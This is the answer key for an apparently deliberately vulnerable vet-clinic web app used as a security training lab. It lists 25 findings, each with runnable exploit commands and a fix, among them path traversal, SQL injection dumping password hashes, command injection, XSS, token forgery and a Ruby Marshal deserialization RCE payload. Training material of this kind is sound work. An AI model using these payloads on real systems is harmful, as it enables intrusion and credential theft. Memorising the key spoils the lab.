# Willowbrook PawPortal — SOLUTIONS (answer key)

> **Spoilers.** This is the full writeup of all 25 intended findings. Do not read it until you have
> finished testing. Every finding below is verified end-to-end by `tests/selftest.py`
> (`python3 tests/selftest.py` → `25/25 findings verified exploitable`).

**Tech stack (revealed):** Ruby + Sinatra (Puma) application, server-rendered ERB, MySQL 8 database,
jQuery/Bootstrap front-end, Docker Compose. None of the other PolyVuln labs use this stack.

In the examples below:

```
BASE=http://192.168.255.133:8095
```

A "client session" is obtained by registering at `/register`; the session cookie is `wb_sid`.
Seed logins discovered during testing (do **not** assume you are given these):

| Role | Email | Password |
|---|---|---|
| Admin (practice manager) | `olivia.grant@willowbrookvets.com` | `Kestrel#Wb-Adm1n-7731` |
| Vet (staff) | `amelia.hart@willowbrookvets.com` | `welcome123` |
| Client | `jessica.moore@example.net` | `tigger` |

---

## Finding index

| # | OWASP 2025 | CWE | Title | Entry point |
|---|---|---|---|---|
| 1 | A01 | CWE-22 | Path traversal | `GET /records/download?file=` |
| 2 | A01 | CWE-352 | CSRF (GET+POST, state change) | `/account/contact` |
| 3 | A01 | CWE-548 | Directory listing / PII exposure | `GET /intake/archive/` |
| 4 | A01 | CWE-918 | SSRF | `POST /pets/:id/photo` (`photo_url`) |
| 5 | A01 | CWE-615 | Secret in client-side source | `/assets/js/portal.js` → roster API |
| 25 | A01 | CWE-639 | IDOR (other users' invoices) | `GET /invoices/:id` |
| 6 | A02 | CWE-16 | CORS misconfiguration | `/api/v1/*` |
| 7 | A02 | CWE-526 | Environment/secret exposure | `GET /api/v1/health?debug=true` |
| 8 | A02 | CWE-1004 | Session cookie without HttpOnly | `wb_sid` |
| 9 | A03 | CWE-1035 | Known-vulnerable components | jQuery 2.2.4 / Bootstrap 3.3.7 |
| 10 | A04 | CWE-319 | Cleartext transmission | whole site (HTTP) |
| 11 | A04 | CWE-328 | Unsalted MD5 password hashing | credential storage |
| 12 | A05 | CWE-78 | OS command injection | `POST /staff/charts/export` (`archive_name`) |
| 13 | A05 | CWE-79 | Reflected XSS (JS context) | `GET /find-a-vet?q=` |
| 14 | A05 | CWE-79 | Stored XSS | appointment `reason` → staff queue |
| 15 | A05 | CWE-89 | SQL injection (UNION) | `GET /api/v1/slots?vet_id=` |
| 16 | A06 | CWE-269 | Mass assignment → privilege escalation | `PATCH /api/v1/me` |
| 17 | A06 | CWE-1021 | Clickjacking | all pages |
| 18 | A07 | CWE-287 | Improper authentication (unsigned token) | `GET /api/v1/admin/users` |
| 19 | A07 | CWE-307/308 | No lockout / single-factor | `POST /staff/login` |
| 20 | A07 | CWE-384 | Session fixation | `GET /m/handoff?sid=` |
| 21 | A07 | CWE-640 | Weak password recovery | `/forgot`, `/forgot/verify` |
| 22 | A08 | CWE-502 | Insecure deserialization (RCE) | `wb_draft` cookie |
| 23 | A09 | CWE-532 | Sensitive data in logs | `/staff/activity`, `log/portal.log` |
| 24 | A10 | CWE-755 | Verbose error handling | any unhandled exception |

---

## A01 — Broken Access Control

### 1. Path traversal — `GET /records/download?file=` (CWE-22)
The record-download route strips `../` **once, non-recursively** (`file.gsub('../','')`), so a
doubled sequence survives the filter and resolves outside the records directory.

```bash
# read arbitrary files relative to app/storage/records
curl -s "$BASE/records/download?file=....//....//....//....//etc/passwd" -b cookies.txt
curl -s "$BASE/records/download?file=....//....//app.rb"       -b cookies.txt   # app source
curl -s "$BASE/records/download?file=....//....//log/portal.log" -b cookies.txt # ties into #23
```
`....//` → after one `../` removal → `../`. Requires any logged-in session.
**Impact:** read application source, the activity log (plaintext creds), `/etc/passwd`.
**Fix:** resolve the path and verify it is still inside the base dir
(`File.expand_path` + `start_with?`), reject any `..`; serve by whitelisted record id, not filename.

### 2. CSRF — `/account/contact` (CWE-352)
The contact/email update is a state-changing action that is accepted over **both GET and POST**, has
**no CSRF token**, and `wb_sid` has **no `SameSite` attribute**. An attacker page can silently change
a victim's sign-in email (and the "forward records to" address) → account takeover.

```html
<!-- victim just has to load this while logged in -->
<img src="http://192.168.255.133:8095/account/contact?email=attacker@evil.test">
```
**Impact:** account takeover (change login email, then use password reset), data exfiltration via the
records-forwarding address.
**Fix:** per-request CSRF tokens on all state changes, reject GET for mutations,
set `SameSite=Lax/Strict` on the session cookie.

### 3. Directory listing & PII exposure — `GET /intake/` (CWE-548)
The `/intake` tree is served with an Apache-style auto-index. Browsing `/intake/archive/` reveals
files that were never meant to be public:

```bash
curl -s "$BASE/intake/archive/"                               # directory index
curl -s "$BASE/intake/archive/client-export-2026-09.csv"      # client PII (names, emails, phones, balances)
curl -s "$BASE/intake/archive/frontdesk-handover.txt"         # internal notes, guest wifi, process hints
```
**Impact:** bulk client PII disclosure; the handover note leaks operational detail (e.g. the reception
kiosk auth model — see #5).
**Fix:** disable directory indexing, keep non-public files out of the web root, require authn/authz.

### 4. SSRF — `POST /pets/:id/photo` (`photo_url`) (CWE-918)
"Import pet photo from URL" fetches an arbitrary attacker-supplied URL server-side with no
host/scheme allow-list and no filtering of internal addresses. The internal ops endpoint
`/internal/*` is restricted to `REMOTE_ADDR` of localhost — but the server itself **is** localhost, so
SSRF reaches it, and the non-image response body is reflected back in the error message.

```bash
# direct access is blocked:
curl -s "$BASE/internal/diagnostics"            # 403 forbidden

# via SSRF it is not — secrets come back in the "couldn't use that link" flash:
curl -s -b cookies.txt -d "photo_url=http://127.0.0.1:8080/internal/diagnostics" \
     "$BASE/pets/1/photo"
# then view /pets/1 — the flash contains DB creds, TOKEN_SIGNING_KEY, SMTP + pharmacy tokens
```
Also reachable: `http://db:3306`, cloud metadata, etc.
**Fix:** allow-list schemes/hosts, resolve and block private/link-local ranges, never reflect the
remote response, require the fetch target to actually be an image.

### 5. Secret in client-side source — `/assets/js/portal.js` (CWE-615)
A commented-out "staff roster widget" in the shipped JavaScript contains a live shared API key:

```js
// var CLINIC_KEY = 'wbk_live_5d0e8a7c41f94b2e9c3a';
```
That key authenticates the otherwise staff-only roster API:

```bash
curl -s -H "X-Clinic-Key: wbk_live_5d0e8a7c41f94b2e9c3a" "$BASE/api/v1/staff/roster"
# → all staff names, emails, phone extensions, roles
```
**Fix:** never embed secrets in client-side assets; rotate the key; put the roster behind a real
session/role check.

### 25. IDOR — `GET /invoices/:id` (CWE-639)
Invoice IDs are sequential (start at 1001) and the view does **no ownership check** (unlike
`/pets/:id`, which does). Any logged-in user can read any invoice — customer name, address, patient,
itemised billing, card brand/last-4.

```bash
for id in 1001 1002 1003 1004 1005 1006; do curl -s -b cookies.txt "$BASE/invoices/$id"; done
```
**Impact:** bulk disclosure of other clients' billing + PII.
**Fix:** enforce `owner_id = current_user` (or a staff role) on every invoice read; use
non-enumerable identifiers.

---

## A02 — Security Misconfiguration

### 6. CORS misconfiguration — `/api/v1/*` (CWE-16)
The API reflects the request `Origin` into `Access-Control-Allow-Origin` **and** sets
`Access-Control-Allow-Credentials: true`. Any website can read a logged-in victim's API responses
cross-origin (profile, etc.).

```bash
curl -s -i -b cookies.txt -H "Origin: https://evil.example" "$BASE/api/v1/me" | grep -i access-control
# Access-Control-Allow-Origin: https://evil.example
# Access-Control-Allow-Credentials: true
```
**Fix:** allow-list trusted origins only; never combine a reflected/`*` origin with credentials.

### 7. Environment / secret exposure — `GET /api/v1/health?debug=true` (CWE-526)
The health endpoint takes an undocumented `debug` flag that dumps the full process environment and
runtime info to **any unauthenticated caller**.

```bash
curl -s "$BASE/api/v1/health?debug=true" | python3 -m json.tool
# environment includes DB_PASS, TOKEN_SIGNING_KEY, CLINIC_API_KEY, SMTP_PASSWORD, PHARMACY_API_TOKEN
```
**Impact:** full secret disclosure (DB creds, the token signing key that enables #18, SMTP/pharmacy
tokens).
**Fix:** remove debug output from production; never return environment variables over HTTP.

### 8. Session cookie without HttpOnly — `wb_sid` (CWE-1004)
`wb_sid` is set without `HttpOnly`, `Secure` or `SameSite`.

```bash
curl -s -i "$BASE/" | grep -i set-cookie
# Set-Cookie: wb_sid=...; path=/        (no HttpOnly/Secure/SameSite)
```
**Impact:** any XSS (#13/#14) can steal the session; cookie usable over plain HTTP (#10); no CSRF
defence (#2). **Fix:** `HttpOnly; Secure; SameSite=Lax`.

---

## A03 — Software Supply Chain Failures

### 9. Known-vulnerable components — jQuery 2.2.4 / Bootstrap 3.3.7 (CWE-1035)
Every page ships end-of-life front-end libraries with public CVEs:

```bash
curl -s "$BASE/" | grep -o 'jquery-2.2.4.min.js'
curl -s "$BASE/assets/vendor/jquery-2.2.4.min.js" | head -c 60     # "jQuery v2.2.4"
curl -s "$BASE/assets/vendor/bootstrap-3.3.7/js/bootstrap.min.js" | head -c 60   # "Bootstrap v3.3.7"
```
jQuery < 3.5 (e.g. CVE-2020-11022/11023) and Bootstrap 3.x data-attribute XSS (CVE-2018-14041 et al.).
**Fix:** upgrade to maintained versions; add dependency scanning (e.g. Trivy/Dependency-Check).

---

## A04 — Cryptographic Failures

### 10. Cleartext transmission (CWE-319)
The app is served over plain HTTP with no TLS and no `Strict-Transport-Security`. Credentials posted
to `/login`, `/staff/login`, `/register` and the bearer token all travel in cleartext.
**Fix:** enforce HTTPS, add HSTS, mark cookies `Secure`.

### 11. Unsalted MD5 password hashing (CWE-328)
Passwords are stored as unsalted `MD5`. You can confirm it without the database: the profile API
returns the stored digest, which equals `md5(password)`.

```bash
curl -s -b cookies.txt "$BASE/api/v1/me" | python3 -c "import sys,json;print(json.load(sys.stdin)['pwd_digest'])"
# == md5(<your password>)  -> confirms unsalted MD5; crackable offline (combine with #15/#18 dumps)
```
**Fix:** use bcrypt/scrypt/Argon2 with per-user salts; never expose the digest.

---

## A05 — Injection

### 12. OS command injection — `POST /staff/charts/export` (`archive_name`) (CWE-78)
The "export patient chart" feature builds a shell command with the unsanitised `archive_name` and
runs it via `/bin/sh -c`. The command output is shown back on the page.

```bash
# staff session required (e.g. amelia.hart / welcome123, or escalate via #16)
curl -s -b staff.txt -d "pet_id=1" --data-urlencode "archive_name=x; id; uname -a #" \
     "$BASE/staff/charts/export"
# → uid=1001(wbapp) gid=1001(wbapp) ... Linux ...
```
**Impact:** remote command execution as the app user; reverse shell, read DB creds from env, pivot to
`db`. **Fix:** never shell out with user input; build the archive with a library, or pass a
whitelisted/validated name as an argv element (no `sh -c`).

### 13. Reflected XSS — `GET /find-a-vet?q=` (CWE-79)
The search term is reflected into an **inline `<script>` string** with only `<`/`>` escaped, so you
break out of the JavaScript string context (not the HTML context).

```
$BASE/find-a-vet?q=%22;alert(document.domain);//
```
Rendered: `var lastSearch = "";alert(document.domain);//";` → script executes.
**Fix:** JSON-encode server→JS data (`.to_json`) / use a data attribute; contextual output encoding; CSP.

### 14. Stored XSS — appointment `reason` → staff queue (CWE-79)
The appointment "reason for visit" is stored and later rendered **raw** both in the client's own
appointment view and, more dangerously, in the **staff appointment queue** (`/staff`) — a stored XSS
that fires in a higher-privileged context.

```bash
# book an appointment with a scripted reason (slot id from GET /api/v1/slots)
curl -s -b cookies.txt -d "pet_id=1&slot_id=<id>" \
     --data-urlencode "reason=<img src=x onerror=alert(document.cookie)>" "$BASE/appointments"
# payload stored verbatim; renders raw in /appointments/<id> and in the staff queue at /staff
```
**Impact:** client → staff account compromise (combine with #8 cookie theft).
**Fix:** HTML-escape on output everywhere (`<%=h ...%>`); CSP.

### 15. SQL injection — `GET /api/v1/slots?vet_id=` (CWE-89)
`vet_id` (and `date`) are concatenated straight into the query. Three selected columns → classic
UNION injection.

```bash
# dump clinic secrets
curl -s -b cookies.txt --get "$BASE/api/v1/slots" \
  --data-urlencode "date=2026-11-22" \
  --data-urlencode "vet_id=0 UNION SELECT setting_key, setting_value, 3 FROM clinic_settings-- -"

# dump credentials (emails + MD5 hashes + roles)
curl -s -b cookies.txt --get "$BASE/api/v1/slots" \
  --data-urlencode "date=2026-11-22" \
  --data-urlencode "vet_id=0 UNION SELECT email, pwd_hash, account_type FROM users-- -"
```
Also fully `sqlmap`-able (`-p vet_id`). **Impact:** full DB read (creds for offline cracking per #11,
SMTP/pharmacy tokens, backup passphrase). **Fix:** parameterised queries / prepared statements;
validate `vet_id` as integer.

---

## A06 — Insecure Design

### 16. Mass assignment → privilege escalation — `PATCH /api/v1/me` (CWE-269)
The profile-update API copies request fields into the users table against an allow-list that
mistakenly includes `account_type`. A normal client can promote themselves to `admin`.

```bash
curl -s -b cookies.txt -X PATCH -H "Content-Type: application/json" \
     -d '{"account_type":"admin"}' "$BASE/api/v1/me"
curl -s -b cookies.txt "$BASE/admin"     # now 200, full user administration
```
**Impact:** full vertical privilege escalation (unlocks #12 staff export, admin pages).
**Fix:** never let clients set role/authz fields; keep them out of any mass-assignment allow-list.

### 17. Clickjacking (CWE-1021)
No `X-Frame-Options` or CSP `frame-ancestors` on any page, including authenticated ones
(`/account`, `/appointments`). The app can be framed and UI-redressed.

```bash
curl -s -i -b cookies.txt "$BASE/account" | grep -iE "x-frame-options|content-security-policy"   # (none)
```
**Fix:** `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.

---

## A07 — Authentication Failures

### 18. Improper authentication — optional token signature (CWE-287)
Mobile bearer tokens are `base64(payload).hmac`. The verifier **skips signature checking when the
signature segment is empty**, and trusts `uid`/`role` from the payload. Forge an admin token with no
signature:

```bash
PAYLOAD=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'uid':1,'role':'admin'}).encode()).decode().rstrip('='))")
curl -s -H "Authorization: Bearer ${PAYLOAD}." "$BASE/api/v1/admin/users"
# → every user incl. email, MD5 pwd_hash, reset codes
```
(Even without this, leaking `TOKEN_SIGNING_KEY` via #7/#4 lets you mint valid signed tokens.)
**Fix:** always require and verify the signature; reject `alg=none`-style empty-sig tokens; don't
trust role claims without server-side checks.

### 19. No lockout / single-factor — `POST /staff/login` (CWE-307 / CWE-308)
No rate-limiting, lockout, CAPTCHA or MFA. Staff passwords are guessable by online brute force
(`amelia.hart@willowbrookvets.com` : `welcome123`).

```bash
# small wordlist finds it in ~18 tries, no lockout
```
**Fix:** account lockout / throttling, MFA for staff, strong-password policy.

### 20. Session fixation — `GET /m/handoff?sid=` (CWE-384)
The "continue on your phone" hand-off sets `wb_sid` to an attacker-chosen value, and `/login` does
**not** rotate the session id on authentication. Fix a victim's session, lure them to log in, then
reuse the known id.

```bash
FIX=fixated0000000000000000
# 1) attacker primes the victim's browser:    $BASE/m/handoff?sid=$FIX
# 2) victim logs in (id unchanged)
# 3) attacker uses the same id:
curl -s -b "wb_sid=$FIX" "$BASE/api/v1/me"    # authenticated as the victim
```
**Fix:** regenerate the session id on every privilege change/login; never accept a client-supplied id.

### 21. Weak password recovery — `/forgot`, `/forgot/verify` (CWE-640)
Multiple weaknesses: a **4-digit** reset code (10 000 possibilities), **no attempt limit** on
verification, **user enumeration** (different response for unknown vs known email), and the code is
written to the activity log (#23).

```bash
curl -s -d "email=nobody@example.test" "$BASE/forgot"   # "couldn't find an account" → enumeration
# then brute 0000-9999 against /forgot/verify with no lockout, or read the code from /staff/activity
```
**Fix:** long random single-use token via email link, attempt limits/expiry, uniform responses, never
log codes.

---

## A08 — Software or Data Integrity Failures

### 22. Insecure deserialization → RCE — `wb_draft` cookie (CWE-502)
"Save booking as draft" stores the draft as a **Ruby `Marshal` blob** in the `wb_draft` cookie and
`Marshal.load`s it on `/appointments/book`. The draft object carries a `@reminder_template` that is
rendered with **ERB**, so a forged object yields server-side template execution → RCE. No server
access is needed to craft it:

```python
import base64
def i(n): return bytes([n+5])                 # small Marshal int
def sym(s): b=s.encode(); return b':'+i(len(b))+b
def st(s):  b=s.encode(); return b'"'+i(len(b))+b
obj = (b'\x04\x08o'+sym('Clinic::BookingDraft')+i(1)
       +sym('@reminder_template')+st("<%= IO.popen('id').read %>"))
print(base64.urlsafe_b64encode(obj).decode().rstrip('='))
# send as:  Cookie: wb_sid=<yours>; wb_draft=<above>   then GET /appointments/book
# the "SMS reminder preview" renders:  uid=1001(wbapp) ...
```
**Impact:** remote code execution as the app user (same blast radius as #12).
**Fix:** never deserialize attacker-controlled data with `Marshal`; use a signed, structured format
(JSON) and never feed stored data into a template engine.

---

## A09 — Security Logging & Alerting Failures

### 23. Sensitive data in logs — `/staff/activity`, `log/portal.log` (CWE-532)
The activity log records **plaintext passwords** (every login attempt, successful or failed), reset
codes, and new passwords from the reset flow. It is readable by any staff user at `/staff/activity`,
and the file itself is readable via the path traversal (#1):

```bash
curl -s -b staff.txt "$BASE/staff/activity" | grep -E "password=|new_password=|code="
curl -s -b cookies.txt "$BASE/records/download?file=....//....//log/portal.log"   # via #1, no staff role
```
**Impact:** credential + reset-code disclosure; enables lateral movement.
**Fix:** never log secrets; redact credentials; restrict and protect log access.

---

## A10 — Mishandling of Exceptional Conditions

### 24. Verbose error handling (CWE-755)
Unhandled exceptions return a debug page / JSON that leaks the failing **SQL statement**, a full
**backtrace**, framework versions and request details. Trivially triggered through the SQLi parameter:

```bash
curl -s -b cookies.txt --get "$BASE/api/v1/slots" \
  --data-urlencode "date=2026-11-22" --data-urlencode "vet_id=1'"       # JSON: Mysql2::Error + query + backtrace
curl -s "$BASE/find-a-vet?q=test" >/dev/null   # HTML error page shows the same for server errors
```
**Impact:** information disclosure that accelerates every other attack (confirms DB engine, table/column
names for #15, file paths for #1). **Fix:** generic error pages, log details server-side only,
disable `show_exceptions`/verbose output in production.

---

## Verification

```bash
./reset.sh                      # clean slate
python3 tests/selftest.py       # RESULT: 25/25 findings verified exploitable
```
